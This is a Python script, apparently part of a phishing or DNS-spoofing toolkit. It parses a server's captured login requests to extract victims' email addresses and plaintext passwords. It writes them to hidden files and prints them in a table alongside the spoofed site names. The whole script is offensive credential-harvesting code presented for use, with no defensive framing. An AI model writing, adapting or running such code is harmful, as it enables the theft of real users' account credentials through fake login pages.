#!/usr/bin/env pyhton
import os
import re
import sys
import time
import subprocess
from subprocess import PIPE

user_name   = os.path.dirname(os.path.abspath(__file__)).split ("/")[2]
Path_St = str("/".join(os.path.dirname(__file__).split('/')[:-1]))
group  = "chown "+ user_name+ ":"+user_name +" "+ Path_St+'/ServerLog/*'
os.system(group)
class dns_result :     
      def __init__(self):

         self.web_Password()
      def web_Password(self):
          print(" "+"-"*102)
          print("| "+f"{'       Site-Name    ':<20}",' |'+f"{'       auth_user    ':<35}","  | "+f"{'         PASSWORD   ':<35}   |")
          print(" "+"-"*102)
          list_web = []
          with open(Path_St+'/ServerLog/.web.txt','w') as file:
                with open (Path_St+'/ServerLog/.Cread.txt','w') as Cread_User :
                   pass
          with open(Path_St+'/ServerLog/log_error.log') as Log_Handel :
              Log_read = Log_Handel.readlines()
          for line in Log_read:     
              if '%40'in  line  :             
                line       = line.split('=')
                line_split = str(line[1:3]).split('+&password')
                line_cread = str("".join(line_split)).replace('+&password',' ').replace('&captcha_text',' ').split(',')
                line_cread_1 = str("".join(line_cread[0])).replace("['",'').replace("'",'')\
                .replace('%40','@').replace("&password",'').replace('+&key1','').replace('&key1','').replace('&session_password','')
                try: 
                    line_cread_2 = str("".join(line_cread[1])).replace("]",'')\
                    .replace("']",'').replace("'",'').replace('\\n','').replace("&signIn",'').replace('&isJsEnabled','').strip()  
                    with open (Path_St+'/ServerLog/.Cread.txt','a') as Cread_User :
                        Cread_User.write(line_cread_1+'\n'+line_cread_2+'\n')
                except IndexError:
                       pass          
                with open(Path_St+'/ServerLog/log_access.log','r') as accesslog:
                        accesslog = accesslog.readlines()#[-243:]
                for line1 in accesslog:    
                      if "GET" in line1 or "POST" in line1:
                          self.domain_web = str(re.findall('https?://(www\.)?([a-zA-Z0-9]+)(\.[a-zA-Z0-9.-]+)', line1 ))\
                          .replace("[('', '",'').replace("')]",'').replace("', '.",'.').replace('[]','').replace('\n','')
                          if self.domain_web not in  list_web:
                               list_web.append(self.domain_web) 
          with open(Path_St+'/ServerLog/.web.txt','r')as FileWeb:
              if list_web in FileWeb:
                    pass
              else:
                  with open(Path_St+'/ServerLog/.web.txt','a') as FileWeb :
                      WebVisit = FileWeb.write(str(list_web)\
                      .replace("['', '",'').replace("']",'').replace("', '",'\n').replace("['",''))
          with open(Path_St+'/ServerLog/.web.txt','r')as FileWeb :
                WebVisit = FileWeb.read().split()             
          with open (Path_St+'/ServerLog/.Cread.txt','r') as Cread_User :  
                Cread_auth = Cread_User.read().split()
          count = 0
          count1 = 0   
          try:     
            for i in range(len(WebVisit)):       
                print("| "+"  "+f"{ WebVisit[count]:<20}"+"|  "
                +f"{  Cread_auth[count1]   :<35}","| "+"  "+f"{     Cread_auth[count1+1]  :<35} |")  
                count  +=1
                count1 +=2
          except IndexError:
              pass    
      
if __name__ =='__main__':
     dns_result()  

